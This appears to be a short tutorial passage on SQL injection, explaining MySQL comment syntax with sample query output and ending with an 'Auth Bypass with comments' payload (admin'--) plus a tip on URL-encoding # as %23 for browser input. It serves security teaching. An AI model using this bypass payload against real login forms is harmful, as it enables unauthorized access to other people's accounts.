## Comments
* `-- -`, `#` - Comments

```sql
mysql> SELECT username FROM logins; -- Selects usernames from the logins table 

+---------------+
| username      |
+---------------+
| admin         |
| administrator |
| john          |
| tom           |
+---------------+
4 rows in set (0.00 sec)
```

```sql
mysql> SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'

+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
+----+----------+----------+---------------------+
1 row in set (0.00 sec)
```

**Tip**: if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.

## Auth Bypass with comments
```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

